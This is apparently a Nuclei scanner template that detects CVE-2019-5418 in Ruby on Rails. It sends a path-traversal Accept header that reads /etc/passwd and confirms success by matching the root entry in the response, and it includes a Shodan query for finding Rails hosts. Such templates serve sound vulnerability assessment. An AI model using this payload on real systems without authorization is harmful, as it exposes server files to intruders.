http:
- headers:
    Accept: ../../../../../../../../etc/passwd{{
  matchers:
  - part: body
    regex:
    - 'root:.*:0:0:'
    type: regex
  - status:
    - 200
    - 500
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}'
id: CVE-2019-5418
info:
  author: omarkurt
  classification:
    cpe: cpe:2.3:a:rubyonrails:rails:*:*:*:*:*:*:*:*
    cve-id: CVE-2019-5418
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22,NVD-CWE-noinfo
    epss-percentile: 0.9995
    epss-score: 0.9434
  description: Rails <5.2.2.1, <5.1.6.2, <5.0.7.2, <4.2.11.1 and v3 are susceptible
    to a file content disclosure vulnerability because specially crafted accept headers
    can cause contents of arbitrary files on the target system's file system to be
    exposed.
  impact: 'This vulnerability can lead to unauthorized access to sensitive information
    stored on the server.

    '
  metadata:
    max-request: 1
    product: rails
    shodan-query: cpe:"cpe:2.3:a:rubyonrails:rails"
    vendor: rubyonrails
  name: Rails File Content Disclosure
  reference:
  - https://github.com/omarkurt/CVE-2019-5418
  - https://weblog.rubyonrails.org/2019/3/13/Rails-4-2-5-1-5-1-6-2-have-been-released/
  - https://nvd.nist.gov/vuln/detail/CVE-2019-5418
  - https://www.exploit-db.com/exploits/46585/
  - http://lists.opensuse.org/opensuse-security-announce/2019-05/msg00011.html
  remediation: 'Apply the patch provided by the Rails team or upgrade to a version
    that includes the fix.

    '
  severity: high
  tags: cve,cve2019,rails,lfi,disclosure,edb,rubyonrails,kev,vkev,vuln
